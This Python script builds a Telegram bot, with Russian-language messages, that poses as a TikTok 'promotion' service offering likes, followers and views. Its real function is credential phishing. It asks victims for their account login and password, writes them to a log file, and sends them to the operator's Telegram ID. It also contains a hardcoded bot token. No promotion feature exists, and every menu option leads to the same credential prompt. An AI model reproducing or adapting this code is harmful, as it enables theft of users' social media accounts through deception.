
import telebot
from telebot import *
import time
print("Бот запущен!")
print("Бот запущен и готов к работе!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '8191068380'
bot = telebot.TeleBot("7971014285:AAGe6IbdI7_dLHsn3UdGBER-wZRKK-buSys")
try:
	bot.send_message(ID, '!Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")

@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
ID: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот продвижения вашего тикток аккаунта!
		Чтобы начать, нажмите /nacrutka''') 

@bot.message_handler(commands=['slivmens'])
def slivmens(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @slivmens. Канал: @slivmens') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
	second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
	button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
	button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество не может быть более 500!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество: {num}')
			msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	get = f'''Полученные данные: 
Получено в боте: tiktok
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: {message.text}
Имя: {message.from_user.first_name}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Ваш логин: {message.text}')

	msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Полученные данные:
Получено в боте: tiktok 
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Пароль: {usrpass}
Имя: {message.from_user.first_name}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


bot.polling()
		
